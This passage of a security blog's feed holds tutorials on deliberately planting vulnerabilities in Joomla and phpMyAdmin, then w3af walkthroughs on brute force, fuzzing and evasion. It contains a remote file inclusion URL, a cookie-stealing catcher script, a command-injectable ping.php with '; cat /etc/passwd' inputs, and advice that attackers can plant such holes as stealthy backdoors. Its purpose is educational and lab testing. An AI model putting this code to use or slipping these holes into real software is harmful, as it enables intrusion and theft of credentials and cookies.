+<p><pre>include($FilePath.&lsquo;.php&rsquo;);</pre></p>
+
+<p><p>This means that the argument is appended with &ldquo;.php&rdquo; and that file name is then included. In this case our previous url will not work because of the extra &ldquo;.php&rdquo; after it. However its effect can be nullified by adding the null byte <i>&ldquo;%00&rdquo;</i> after the url. This escapes all the stuff after the null byte.</p></p>
+
+<p><p>Hence in this case our url would be.. </p></p>
+
+<p><pre><a href="http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com%00codeDoesntGoHere">http://127.0.0.1/Joomla/index.php?option=com_infosec&amp;name=InfosecInstitute&amp;imp_file=http://google.com%00codeDoesntGoHere</a></pre></p>
+
+<p><b>3) Inserting Information Disclosure vulnerability</b></p>
+
+<p><p>Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name <i>&ldquo;configurations.php&rdquo;</i> and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension <i>&ldquo;.bak&rdquo;</i>. Hence the backup file for the configuration file <i>&ldquo;configurations.php&rdquo;</i> would be named as &ldquo;configurations.php.bak&rdquo;. However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker&rsquo;s side, though it can also be done by the use of automated tools. The .bak file looks something like this.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/config_file.png" width="1140" height="702" alt="Config File"></p>
+
+<p><p>As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.</p></p>
+
+<p><p>Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the <i>robots.txt</i> file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the <i>robots.txt</i> file. When we browse to the </i>robots.txt</i> file for Joomla we get something like this.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/16.png" width="750" height="486" alt="16"></p>
+
+<p><p>We now know that the admin is protecting something from the web crawlers, a folder with a weird name <i>21lnkqasdsacnd1eqwdn22qwd2wd</i>. Let&rsquo;s check it out. </p>
+<img src="http://prateek147.github.io/images/posts/insvul/17.png" width="851" height="343" alt="17"></p>
+
+<p><p>The <i>password.txt</i> file is available for anyone to view. Some developers think that the <i>robots.txt</i> file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.</p></p>
+
+<p><b>4)Inserting CSRF (Cross Site Request Forgery) Vulnerability</b></p>
+
+<p><p>CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker&rsquo;s website which would be submitted to the trusted website on behalf of the victim.</p></p>
+
+<p><p>There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won&rsquo;t have access to the user&rsquo;s credentials and hence won&rsquo;t be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found <a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">here</a>.</p></p>
+
+<p><p>For inserting the next two vulnerabilities we are going to use the web application <i>phpMyAdmin</i>. More information on phpMyAdmin and to know the steps to install it, click <a href="http://www.phpmyadmin.net/documentation/">here</a>.</p></p>
+
+<p><b>5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities</b></p>
+
+<p><p>Let&rsquo;s assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html <i><a href="http://site-IP/phpmyadmin/message.html">http://site-IP/phpmyadmin/message.html</a></i> that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the <i>text.html</i> page. So if an attacker can inject malicious code in the message field then that code would execute on the admin&rsquo;s machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin&rsquo;s cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable <i>&lsquo;c&rsquo;</i>. We pass the variable <i>c</i> as document.cookie (i.e the user&rsquo;s cookie) to the <i>Cookie Catcher</i> file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is <i><a href="http://infosecinstitute.com/cookie_catcher.php">http://infosecinstitute.com/cookie_catcher.php</a></i> then the request that we will send from the client machine through XSS is <i><a href="http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE">http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE</a></i>. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named <i>user_info.html</i>.</p></p>
+
+<p><p class="code">Code for &ldquo;message.html&rdquo;, the message to the admin is sent from here</p></p>
+
+<p>``` php</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt; POST YOUR MESSAGE TO ADMIN HERE ! &lt;/head&gt;
+&lt;body&gt;
+&lt;form action="message.php" method="get"&gt;
+    &lt;input type="text" name="c" /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;   
+</code></pre>
+
+<p>```</p>
+
+<p><p class="code">Code for &ldquo;message.php&rdquo;, once the message is sent, this code stores the message in a file named text.html</p></p>
+
+<p>``` php
+ &lt;?php</p>
+
+<pre><code>$text = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");;
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('text.html', 'a');
+fwrite($fp, 'Message: '.$text.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; Referer: '.$referer.'&lt;br&gt;&lt;br&gt;&lt;br&gt;');
+fclose($fp);
+//Redirect the user to google.com
+header ("Location: http://www.google.com");
+</code></pre>
+
+<p> ?> <br/>
+```</p>
+
+<p><p class="code">Code for &ldquo;Cookie Catcher file&rdquo;. Note that this file should be stored somewhere on the internet, we call the url of the file with an argument &ldquo;c&rdquo; in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named &ldquo;user_info.html&rdquo;. </p></p>
+
+<p>``` php
+   &lt;?php</p>
+
+<pre><code>$cookie = $_GET['c'];
+$ip = getenv ('REMOTE_ADDR');
+$date=date("j F, Y, g:i a");;
+$referer=getenv ('HTTP_REFERER');
+$fp = fopen('user_info.html', 'a');
+fwrite($fp, 'Cookie: '.$cookie.'&lt;br&gt; IP: ' .$ip. '&lt;br&gt; Date and Time: ' .$date. '&lt;br&gt; Referer: '.$referer.'&lt;br&gt;&lt;br&gt;&lt;br&gt;');
+fclose($fp);
+//Redirect the user to google.com
+header ("Location: http://www.google.com");
+?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p><b>5) Inserting Remote Command Execution vulnerability</b></p>
+
+<p><p>Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this <i>&ldquo;127.0.0.1 ; ls&rdquo; OR &ldquo;127.0.0.1 ; cat /etc/passwd&rdquo;</i> he can run these commands on the remote webserver and see the output too.</p></p>
+
+<p><p>Here is how the footer appears in phpMyAdmin</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/phpRemoteExexVuln.png" width="1000" height="722" alt="PhpRemoteExexVuln"></p>
+
+<p><p>Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/insvul/remoteExecResult.png" width="1000" height="416" alt="RemoteExecResult"></p>
+
+<p><p class="code">Here is the code for the file &ldquo;config.footer.inc.php&rdquo; </p>
+``` php
+   &lt;?php
+?>
+<html></p>
+
+<p><h1>Find which server is online anywhere in the world</h1></p>
+
+<pre><code>    &lt;p&gt;Enter an IP address of the server below:&lt;/p&gt;
+    &lt;form name="ping" action="ping.php" method="post"&gt;
+        &lt;input type="text" name="ip" size="30"&gt;
+        &lt;input type="submit" value="submit" name="submit"&gt;
+    &lt;/form&gt;
+</code></pre>
+
+<p></html>
+```</p>
+
+<p><p class="code">Here is the code for the file &ldquo;ping.php&rdquo; </p>
+``` php</p>
+
+<pre><code> &lt;?php
+        if( isset( $_POST[ 'submit' ] ) ) 
+        {
+        $target = $_REQUEST[ 'ip' ];
+        $cmd = shell_exec( 'ping  -c 3 ' . $target );
+        echo $cmd;
+        }
+    ?&gt;
+</code></pre>
+
+<p>```</p>
+
+<p><h2>Conclusion</h2></p>
+
+<p><p>In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it&rsquo;s users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.</p></p>
+
+<p><h2>References:</h2>
+<ul>
+<li><p>PHP: The configuration file &ndash; Manual</br><a href="http://php.net/manual/en/configuration.file.php">http://php.net/manual/en/configuration.file.php</a></p>
+</li></p>
+
+<p><li><p>Cross-site_request_forgery</br><a href="http://en.wikipedia.org/wiki/Cross-site_request_forgery">http://en.wikipedia.org/wiki/Cross-site_request_forgery</a></p></li></p>
+
+<p>&lt;/ul</p>
+
+<p><p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[w3af walkthrough and tutorial part 4 - w3af tools]]></title>
+    <link href="http://prateek147.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-4-w3af-tools"/>
+    <updated>2013-06-13T20:35:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-4-w3af-tools</id>
+    <content type="html"><![CDATA[<p>In the previous articles in this series, we looked at all the plugins available in w3af and looked at their applications in different scenarios. In this article, we will look at some of the other tools present in w3af which allow us to send Manual Requests, perform Fuzzing, Encode and Decode requests and responses, use a Proxy to intercept and modify requests and responses, and allow us to perform a comparison between different HTTP requests and responses. We will also look at how we can write our own w3af scripts to automate the task of Web Application Penetration Testing. We will then look at the various profiles present in w3af.</p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<p><b>1)Manual Request -</b>The Manual Request feature in w3af allows us to send specially crafted requests and then analyze the response. This technique could be used in various cases which includes testing for SQL Injection, Cross Site Scripting etc. The tools present in w3af can be found by clicking on the <i>Tools</i> menu as shown in the figure below. Click on <i>Manual Request</i> to open up the Manual Request editor tool.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/1.png" width="800" height="196" alt="1"></p>
+
+<p>Once this is done, you can write your own manual request and send it to analyze the response. As you can see from the figure below, i am making a simple GET request to http://google.com . Also, you might want to change the <i>User-Agent</i> field as this gives away the fact that the request is coming from w3af.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/2.png" width="794" height="256" alt="2"></p>
+
+<p>Click on <i>Send Request</i> to send the request. Once this is done, the response will be displayed. You can then simply analyze the response or send it to other w3af tools.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/3.png" width="800" height="556" alt="3"></p>
+
+<p>It is also possible to send requests to the Manual Request Editor from the results of scans by clicking on its corresponding button below the request/response as shown in the figure below. Same applies to all the other tools like Encoder/Decoder, Fuzzy Request editor, Export Requests etc.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/X.png" width="1160" height="351" alt="X"></p>
+
+<p><p><b>2)Fuzzy Request &ndash;</b> The Fuzzy Request feature present in w3af allows us to send different requests with varying data and analyze the responses.</p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/4.png" width="1002" height="688" alt="4"></p>
+
+<p><p>The fuzzy request editor is shown in the figure above. The varying text is added between the dollar sign ($). It is clear from the figure above that the varying data is determined by the syntax &ldquo;$xrange(10)$&rdquo; which includes numbers from 0 to 9. In case two such text generators are present, then the requests will be combined. For e.g if one of the generator generates 5 values whereas the other generator generates 6 values, then the total number of requests that will be sent will be 30. Some of the common syntax used to generate variable text is shown in the figure below from w3af GUI.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/5.png" width="471" height="146" alt="5"></p>
+
+<p><p>Once we have written the generators, we can simply click on <i>Analyze</i> to analyze the requests that will be generated during the fuzzing test. This is useful because it allows you to actually see these requests before sending them.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/6.png" width="1013" height="688" alt="6"></p>
+
+<p><p>Click on the play button in the bottom left to send the requests. Once the requests have been sent, you can analyze the responses by clicking on the Response tab. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/7.png" width="999" height="689" alt="7"></p>
+
+<p><p>Once the responses are received, you can seperate these responses into different clusters. There are different clustering methods present in w3af which have different ways of determining the distance between these HTTP responses. Using these responses, different clusters are created and the responses with the minimum difference between them are added to the same cluster. This is a quick way to determine which response stands out as different from the other responses which is an important step in Fuzzing.</p></p>
+
+<p><p>The figure below shows the cluster created by  using the method <i>Levenshtein distance of the HTTP bodies</i>. w3af also allows you to write a customized clustering method to perform the task. It is also possible to send requests to the Fuzzy Request generator from the results of scans.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/8.png" width="727" height="541" alt="8"></p>
+
+<p><p><b>3)Encode/Decode &ndash;</b> The Encode/Decode tool in w3af is used to encode or decode strings, urls etc. You can choose from a variety of encoding and decoding options. The figure below shows a base64 encoded string being decoded by the w3af decode tool.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/9.png" width="1001" height="531" alt="9"></p>
+
+<p><p><b>4)Export Requests &ndash;</b> The Export Requests tools allows us to generate code in different languages which when run will regenerate the request. In the figure below, i am generating some code in Python, which when run will regenerate the original request. The Export Requests tool allow you to generate code in HTML, Ajax, Python and Ruby.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/10.png" width="1085" height="602" alt="10"></p>
+
+<p><p><b>5)Compare &ndash;</b> The Compare tool is used to perform comparison between 2 requests/responses. As shown in the figure below, i have sent the comparer tool 2 responses for 2 different requests. The difference between these responses is highlighted by the comparer tool.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/11.png" width="1002" height="534" alt="11"></p>
+
+<p><p><b>6)Proxy &ndash;</b> w3af also comes with an intercepting proxy that allow us to intercept requests, and modify them on the fly. To use this proxy, we have to configure our browser to use this proxy. In case of real world web application testing, it is important that we intercept only those requests that we want. The figure below shows the configuration for the proxy. We can see that it is running on port 8080. We have also configured the proxy to not trap requests for certain images, css, swf files etc.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/12.png" width="1000" height="693" alt="12"></p>
+
+<p><p>Let&rsquo;s configure our browse to route traffic through this proxy.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/13.png" width="610" height="572" alt="13"></p>
+
+<p><p>Once this is done, start browsing through your browser. You will see the requests and the responses appearing in the History tab as shown in the figure below. Right now the requests and responses are being passed through the proxy without interception.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/14.png" width="998" height="688" alt="14"></p>
+
+<p><p>As discussed before in this article, you can send the requests/responses to the other tools like Manual Request editor, Fuzzy Request editor etc present in w3af. Click on the arrow pointing downwards on the top left to start intercepting the requests. If you browse through the proxy now, you will notice that the requests are being intercepted by the proxy as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/15.png" width="1002" height="690" alt="15"></p>
+
+<p><p>You can simply Drop the request so that it doesn&rsquo;t reach its destination, forward it as it was or modify the request and then forward it. For e.g in the intercepted request shown in the figure below, we can see that the search query was <i>w3af</i>. We can easily change it to whatever search query we want it to be. Some of the other uses of w3af proxy could be finding out the parameter names through which the authentication credentials are sent in a login submission.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/16.png" width="1191" height="695" alt="16"></p>
+
+<p><h2>w3af scripting</h2></p>
+
+<p><p>Many times we have to perform scans on different websites with the same set of plugins and the same configurations. However, for every new scan (or every new profile), we have to select the plugins, configure the options each time. This process could be time consuming. w3af scripting makes this very easy for us. We can write our own w3af scripts to automate the task of selecting the plugins, and performing the scan on different websites. w3af scripts end with the extension &ldquo;.w3af&rdquo; . We write a set of w3af console commands in the file. Once the script is run, each w3af console command will get executed in each line in the same order as they were written in the file. This is just the same way we would be using the w3af console. If we want to perform the scan on a different website with the same set of plugins, we can just change the target in the script. One other thing about running w3af scripts is that you can add your own commands once the script has run and made its changes. For e.g if i want to perform a scan with the same set of plugins and options on different websites i can just write a script which sets the plugins and the configurations without setting the target. Once the script has run, we can enter the target ourselves and then run the scan.</p></p>
+
+<p><p>Let&rsquo;s start by writing a simple script to demonstrate the use of w3af scripts. In the figure below, i am writing a script that sets some plugins for a vulnerability scan. As it is clear from the figure below, i am using the webSpider discovery plugin, the xss and sqli audit plugins and the getMails grep plugin.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/17.png" width="1246" height="196" alt="17"></p>
+
+<p><p>Once this is done, we save the file as simple-config.w3af. To run the script we just have to use the command <i>&ldquo;./w3af_console -s simple-config.w3af&rdquo;</i>.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/18.png" width="547" height="49" alt="18"></p>
+
+<p><p> We can see the output in the figure below. Once this is done, we can simply set the target ourselves and start the scan. Hence, having prewritten w3af scripts for different kinds of scans can save us a lot of time.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/19.png" width="1424" height="485" alt="19"></p>
+
+<p><p>The following figure below shows another example of a w3af script which when run enables some plugins and starts the scan against the specified target.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/20.png" width="1066" height="188" alt="20"></p>
+
+<p><h2>w3af profiles</h2></p>
+
+<p><p>A w3af profile can be defined as a profile with preconfigured plugins made for a specific scenario keeping the resources and time availability in mind. We can also create our own w3af profile. However, w3af offers some of its own set of profiles which we can use in our scan as shown in the figure below.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af4/21.png" width="339" height="336" alt="21"></p>
+
+<p><p>Let&rsquo;s discuss all these profiles in brief.</p></p>
+
+<p><p><b>1)OWASP_TOP10</b>&ndash; This profile searches the target web application for the ten most common security vulnerabilities defined by OWASP.</p></p>
+
+<p><p><b>2)audit_high_risk</b>&ndash; This profile searches the target web application for high risk vulnerabilities like OS commanding etc which can later be used to fully compromise the web application.</p></p>
+
+<p><p><b>3)bruteforce</b>&ndash; This profile can be used to perfom a bruteforce attack on the web application.</p></p>
+
+<p><p><b>4)fast_scan</b>&ndash; This profile is used to perform a fast scan of the target web application. It uses only the webSpider plugin for discovery as enabling a large number of discovery plugins can take a long time.</p></p>
+
+<p><p><b>5)full_audit</b>&ndash; This profile performs a full audit of the web application. It has almost all the audit, bruteforce and grep plugins enabled. Like the fast_scan profile, this also uses the webSpider plugin for discovery.</p></p>
+
+<p><p><b>6)full_audit_manual_disc</b> &ndash; This profile is very similar to the full_audit profile, except that it also uses the SpiderMan plugin to perform manual discovery on the target web application. The SpiderMan and the webSpider plugins communicate with each other to find as much information as possible about the web application.</p></p>
+
+<p><p><b>7)sitemap</b>&ndash; This profiles uses different discovery plugins like robotsReader, yahooSiteExplorer etc to create a sitemap of the target application.</p></p>
+
+<p><p><b>8)web_infrastructure</b>&ndash; This profiles uses some of the discovery plugins like fingerprint_os, hmap, serverHeader etc to fingerprint the web application.</p></p>
+
+<p><h2>Conclusion</h2></p>
+
+<p><p>In this article we looked at the various tools like Proxy, Manual Request editor etc that w3af has to offer to help us perform web application vulnerability assessment and penetration testing. We then looked at how we can write our own w3af scripts to help automate the task of web application testing. Finally, we then looked at all the different preconfigured profiles that w3af has to offer and discussed their applications in different scenarios.</p></p>
+
+<p><p>This article is the final article in the <i>&ldquo;w3af walkthrough and tutorial&rdquo;</i> series. Please drop a comment if you liked this series or if you have any questions regarding this series.</p></p>
+
+<p><h2>References:</h2></p>
+
+<p><ul>
+<li><p>w3af User Guide</br><a href ="http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf"><a href="http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf">http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf</a></a></p>
+</li>
+<li><p>w3af-Plugins and descriptions</br><a href="http://w3af.sourceforge.net/plugin-descriptions.php"><a href="http://w3af.sourceforge.net/plugin-descriptions.php">http://w3af.sourceforge.net/plugin-descriptions.php</a></a></p>
+</li></p>
+
+<p></ul></p>
+
+<p><p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[w3af walkthrough and tutorial part 3 - Remaining plugins]]></title>
+    <link href="http://prateek147.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-3-remaining-plugins"/>
+    <updated>2013-06-13T20:27:00+04:00</updated>
+    <id>http://prateek147.github.io/2013/06/13/w3af-walkthrough-and-tutorial-part-3-remaining-plugins</id>
+    <content type="html"><![CDATA[<p>In the previous article <a href ="http://resources.infosecinstitute.com/w3af-tutorial-2/">w3af walkthrough and tutorial part 2 - Discovery and Audit plugins</a> we looked at the various discovery and audit plugins used by w3af to identify vulnerabilities in a web application. We also looked at how we can exploit these vulnerabilities by using the exploit plugins present in w3af. In this article, we will look at the remaining plugins present in w3af which are bruteforce, grep, mangle, output, auth and evasion plugins and look at their applications in web application penetration testing.</p>
+
+
+
+
+<!-- more -->
+
+
+
+
+<p>We will still be using the same test environment which we used in part 2, which is the <i>"w3af test environment"</i> present in Web Security Dojo. Web Security Dojo is a vulnerable VM which has some vulnerable web applications as well as the tools needed to break into these web applications. It has both the console and the GUI versions of w3af. You can get a copy of Web Security Dojo from <a href="http://sourceforge.net/projects/websecuritydojo/files/">here</a>.</p>
+
+
+
+
+<p><b>1)Brute force</b> - Brute force plugins can be used to brute force login forms as well as http-auth logins. Once the discovery plugin finds any form with form based input or an http-auth input it will automatically launch the brute force attack against it if the corresponding brute force plugin is enabled. However, brute force plugins can be run as a seperate plugin themselves and can be used to carry out targeted attacks against a particular url with login forms. Some of the important things to set while running the brute force plugins are the configuration parameters. Brute force attacks take a long time and hence it is important to configure the options to maximize the efficiency with the minimum time.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/Screen Shot 2012-03-21 at 2.20.11 PM.png" width="1069" height="475" alt="Screen Shot 2012 03 21 At 2.20.11 PM"></p>
+
+<p>It is advisable that you use your own list of files for the list of usernames and passwords. However w3af has its own set of files containing usernames and passwords. Also be sure to take a look at some of the other options. The useProfiling options uses the list of passwords generated by the passwordProfiling plugin. The passwordProfiling plugin is one of the grep plugins which generates a list of possible passwords by reading the responses and counting the most common words. The profilingNumber option indicates the number of passwords from the result of the passwordProfiling plugin to use for the bruteforce attack. The useLeetPasswd option uses leet passwords also for the attack. An example of a Leet password would be l33t (for the password leet).One of the other good configurable parameter is the useMails option. This options uses the email addresses that w3af finds (maybe through the grep plugin) to be one of the inputs for the username field. For e.g if one of the usernames is example@infosecinstitute.com, then the username tried would be example. This is another example of how the interaction between the different plugins in w3af could make the job much more effective.</p>
+
+
+
+
+<p>In this case, we will be going ahead and carrying out a bruteforce attack on the login form as shown in the figure below.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/2.png" width="1066" height="187" alt="2"></p>
+
+<p>Let's go ahead and give the url of the login form as a target to w3af. Also make sure that the formAuthBrute plugin is selected and configure the parameters according to your need. Once this is done, click on <i>start</i> to launch the attack</p>
+
+
+<p>.</p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/3.png" width="1436" height="646" alt="3"></p>
+
+<p>As you can clearly see from the output, w3af found the username and password as admin/1234.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/4.png" width="1437" height="669" alt="4"></p>
+
+<p><i>However, this is not always the case with every brute force attack</i>. w3af and many other tools gives false positives on brute force attacks. Different tools have different ways to determine whether an attack has been successful or not. Some of the tools look for particular strings like "successful" or "logged in" etc to determine whether the attack has been successful or not. While some tools look for the response codes to determine whether the response was successful or not. This often leads to false positives because some application return the HTTP Status Code 200 with successful as well as unsuccessful login requests. Some tools identify the status code 200 as a metric for successful authentication and hence return false positives. Application which have the minimal difference in response between a successful or an unsuccessful login are likely to give away false positives when a tool is run against them. For e.g when the application DVWA (Damm Vulnerable web application) is configured on Security Level "High", it just returns the response with a different length value for a successful login than for an unsuccessful login as shown in the figure below. (test perfomed by using BurpSuite)</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/5.png" width="782" height="550" alt="5"></p>
+
+<p>Even the response codes are same in this case for both successful or unsuccessful logins. Hence it is often not advisable to look at what the tool says about a successful attack. Rather we should look at the response for different scenarios and see how they differ from each other. We will discuss these things in more detail later in this series.</p>
+
+
+<p><b>2)Grep</b>-The grep plugin is used to find interesting information in the requests and responses going through like email accounts, forms with file upload capabilities, hashes, credit card numbers, email addresses etc. You can set the type of information you want to look for by setting the appropriate plugin. Since the grep plugin only analyzes the request and response, it is important to have some kind of discovery plugin enabled for it to work. Otherwise grep plugins are of no use. The information obtained by the grep plugins can be used by other plugins, for e.g the information obtained by the passwordProfiling plugin is used by the bruteForce plugin.</p></p>
+
+<p>Let's run a simple test for the grep plugin. From the test environment, we give a url to w3af which has a credit card number in it as shown in the figure below. From the grep plugins list, make sure that the <i>creditCards</i> plugin is selected. Once this is done, click on <i>Start</i> to start the scan.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/6.png" width="1438" height="446" alt="6"></p>
+
+<p>As we can see from the figure below, w3af found the credit card number present in the page. Let's discuss some of the most important grep plugins.</p>
+
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/1 copy.png" width="1428" height="256" alt="1 Copy"></p>
+
+<p><p>a)Code Disclosure- This plugins checks the page for code disclosure vulnerabilities. It does this by looking for the expressions &lt;?.<em>?> and &lt;%.</em>%> which could reveal server side code like php etc. The test result from the figure below shows a code disclosure vulnerability found.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/7.png" width="1438" height="228" alt="7"></p>
+
+<p><p>However, it is important to check whether the result is a false positive or not. As recommended in the previous articles in this series, it is always good to analyze the requests and responses which actually lead to the identification of that particular vulnerability. As we can see from the figure below, there is indeed a code disclosure vulnerability.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/8.png" width="1440" height="621" alt="8"></p>
+
+<p><p>b)DOM Based XSS-The DOM based XSS plugin helps find XSS vulnerabilities. This occurs when a user input is used to output the data in the DOM. As we can see from the code of the page below, it looks for a parameter name, and then outputs that value in the DOM. However, from the code we can see that the paramter value is not being validated. Hence this is vulnerable to DOM Based XSS.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/9.png" width="1084" height="394" alt="9"></p>
+
+<p><p>When we select this plugin and run a test against it, we see that w3af is able to find the DOM based XSS vulnerability.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/10.png" width="1437" height="306" alt="10"></p>
+
+<p><p>Again, it is important to check the request and response for the corresponding vulnerability and figure out if it was a false positive or not.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/11.png" width="1433" height="588" alt="11"></p>
+
+<p><p>c)findComments- The findComments plugin is used to check the response for interesting comments. For e.g a string containing the word &ldquo;password&rdquo; would be tagged as interesting and would be reported.</p></p>
+
+<p><p>d)getMails-This is one of the most important grep plugins. It looks for email addresses in every page. This information could then be used by the brute force plugins. Collecting emails form an important part of the information gathering stage during a penetration test.</p></p>
+
+<p><p>e)fileUpload-This plugin checks every page for file upload capabilities so that it can be further checked for fileUpload vulnerabilities. The figure below shows the result of running the fileUpload plugin against a page which contains a file upload capability. </p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/12.png" width="1439" height="324" alt="12"></p>
+
+<p><p><b>3)Evasion</b>&ndash; Evasion plugins are used to modify requests in order to bypass any WAF or IPS etc. It does this by modifying requests in unique ways so that the signature is not detected by Intrusion Prevention Systems. I contacted <i>Andres Riancho</i> (the original author of w3af), and he had this to say about Evasion plugins.</p></p>
+
+<p><i>&ldquo;In evasion plugins I would also recommend only enabling one at the time and only doing so if you really know what you&rsquo;re doing as it may break the scan and make it unstable&rdquo;</i></p>
+
+<p><p>Let&rsquo;s see some of the Evasion plugins and see how they work.</p></p>
+
